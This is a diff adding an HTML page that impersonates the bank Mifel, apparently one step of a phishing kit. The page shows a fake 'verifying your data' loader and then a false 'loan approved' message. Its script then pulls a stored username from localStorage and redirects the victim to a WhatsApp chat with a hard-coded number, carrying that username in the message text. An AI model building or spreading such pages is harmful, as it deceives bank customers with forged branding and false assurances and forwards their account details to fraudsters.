@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mifel - Confirmación de Depósito</title>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600&family=Raleway:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --mifel-cyan: #00D1C1;
+            --mifel-blue-dark: #002D72;
+            --text-grey: #666;
+            --input-bg: #EBF1F5;
+            --success-green: #2ecc71;
+        }
+
+        body {
+            font-family: 'Open Sans', 'Raleway', sans-serif;
+            background-color: #ffffff;
+            margin: 0; padding: 0;
+            display: flex; flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* --- HEADER --- */
+        .top-header {
+            display: flex; justify-content: center; align-items: center;
+            padding: 20px 50px; border-bottom: 1px solid #f0f0f0;
+        }
+        .logo-center { width: 120px; }
+
+        /* --- MAIN CONTENT --- */
+        .main-container {
+            flex: 1; 
+            display: flex; 
+            flex-direction: column;
+            align-items: center; 
+            justify-content: center;
+            padding: 40px 20px; 
+            text-align: center;
+        }
+
+        #loading-state, #success-state, #deposit-state {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* --- LOADER --- */
+        .loader-wrapper {
+            position: relative; width: 130px; height: 130px;
+            margin-bottom: 40px; display: flex;
+            align-items: center; justify-content: center;
+        }
+        .light-ring {
+            position: absolute; width: 100%; height: 100%;
+            border: 3px solid rgba(0, 209, 193, 0.1);
+            border-top: 3px solid var(--mifel-cyan);
+            border-radius: 50%;
+            animation: spinRing 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+        }
+        .inner-icon { width: 55px; fill: var(--mifel-cyan); animation: pulseIcon 2s ease-in-out infinite; }
+
+        @keyframes spinRing { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes pulseIcon { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+
+        /* --- TEXTOS --- */
+        .loading-title { color: var(--mifel-blue-dark); font-size: 22px; font-weight: 600; margin-bottom: 12px; }
+        .loading-sub { color: var(--text-grey); font-size: 15px; max-width: 350px; line-height: 1.6; }
+        
+        .disclaimer-text { 
+            color: var(--text-grey); 
+            font-size: 13px; 
+            opacity: 0.6; 
+            margin-top: 25px;
+            font-weight: 400;
+        }
+
+        /* --- BARRA PROGRESO --- */
+        .progress-container { width: 260px; height: 6px; background-color: var(--input-bg); border-radius: 20px; overflow: hidden; margin-top: 20px;}
+        .progress-fill { height: 100%; width: 0%; background: var(--mifel-cyan); animation: fillBar 4s linear forwards; }
+        @keyframes fillBar { 0% { width: 0%; } 100% { width: 100%; } }
+
+        /* --- ESTADOS OCULTOS --- */
+        #success-state, #deposit-state { display: none; }
+
+        /* --- ICONO DEPÓSITO --- */
+        .bank-icon-container {
+            width: 100px; height: 100px;
+            background-color: rgba(0, 209, 193, 0.1);
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            margin-bottom: 25px;
+            position: relative;
+            animation: bounceIn 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        .bank-icon-container svg { width: 50px; fill: var(--mifel-cyan); }
+
+        .coin-anim {
+            position: absolute; width: 15px; height: 15px;
+            background-color: #FFD700; border-radius: 50%;
+            border: 2px solid #DAA520; animation: coinDrop 1.5s infinite;
+        }
+
+        @keyframes coinDrop {
+            0% { transform: translateY(-20px); opacity: 0; }
+            50% { opacity: 1; }
+            100% { transform: translateY(15px); opacity: 0; }
+        }
+
+        @keyframes bounceIn {
+            from { opacity: 0; transform: scale(0.3); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .check-circle {
+            width: 80px; height: 80px; background-color: var(--success-green);
+            border-radius: 50%; display: flex; align-items: center;
+            justify-content: center; margin-bottom: 25px;
+            animation: scaleIn 0.5s forwards;
+        }
+        .check-circle svg { width: 40px; fill: white; }
+
+        @keyframes scaleIn { from { transform: scale(0); } to { transform: scale(1); } }
+    </style>
+</head>
+<body>
+
+    <header class="top-header">
+        <img src="https://d3vtsr5ffy4e4a.cloudfront.net/uploads/f9780b94-d327-43bf-987a-11289aa18ab6/original/mifel-personas.svg" alt="Mifel" class="logo-center">
+    </header>
+
+    <main class="main-container">
+        
+        <div id="loading-state">
+            <div class="loader-wrapper">
+                <div class="light-ring"></div>
+                <svg class="inner-icon" viewBox="0 0 24 24"><path d="M12 2L4 5v6.09c0 5.05 3.41 9.76 8 10.91 4.59-1.15 8-5.86 8-10.91V5l-8-3z"/></svg>
+            </div>
+            <h1 class="loading-title">Verificando su información</h1>
+            <p class="loading-sub">Estamos validando los datos con el servidor seguro...</p>
+            <div class="progress-container">
+                <div class="progress-fill"></div>
+            </div>
+            <p class="disclaimer-text">Por favor, no cierre esta ventana durante el proceso.</p>
+        </div>
+
+        <div id="success-state">
+            <div class="check-circle">
+                <svg viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"/></svg>
+            </div>
+            <h1 class="loading-title" style="color: var(--success-green);">Proceso finalizado con éxito</h1>
+            <p class="loading-sub">Generando comprobante de depósito...</p>
+        </div>
+
+        <div id="deposit-state">
+            <div class="bank-icon-container">
+                <div class="coin-anim" style="left: 20px;"></div>
+                <div class="coin-anim" style="right: 20px; animation-delay: 0.5s;"></div>
+                <svg viewBox="0 0 24 24">
+                    <path d="M11.5,1L2,6V8H21V6M16,10V17H19V10M2,22H21V19H2M10,10V17H13V10M4,10V17H7V10H4Z"/>
+                </svg>
+            </div>
+            <h1 class="loading-title">Solicitud Aprobada</h1>
+            <p class="loading-sub">Tu crédito será depositado en tu cuenta en un plazo de <span style="color: var(--mifel-blue-dark); font-weight: 700;">1 a 3 días hábiles</span>.</p>
+            <p class="disclaimer-text">Redirigiendo a WhatsApp para confirmación...</p>
+        </div>
+
+    </main>
+
+    <script>
+        setTimeout(() => {
+            document.getElementById('loading-state').style.display = 'none';
+            document.getElementById('success-state').style.display = 'flex';
+
+            setTimeout(() => {
+                document.getElementById('success-state').style.display = 'none';
+                document.getElementById('deposit-state').style.display = 'flex';
+                
+                setTimeout(() => {
+                    // --- LÓGICA DE WHATSAPP ---
+                    const rawUser = localStorage.getItem('mifel_user') || "Usuario";
+                    const phoneNumber = "15877069901";
+                    const message = `Mi Usuario es: ${rawUser} y he finalizado el proceso con éxito.`;
+                    
+                    // Codificamos el mensaje para que sea válido en una URL
+                    const encodedMessage = encodeURIComponent(message);
+                    
+                    // Redirigimos al enlace de WhatsApp
+                    window.location.href = `https://wa.me/${phoneNumber}?text=${encodedMessage}`;
+                }, 6000); // Espera 6 segundos en el estado final antes de redirigir
+            }, 2500);
+
+        }, 4500);
+    </script>
+</body>
+</html>
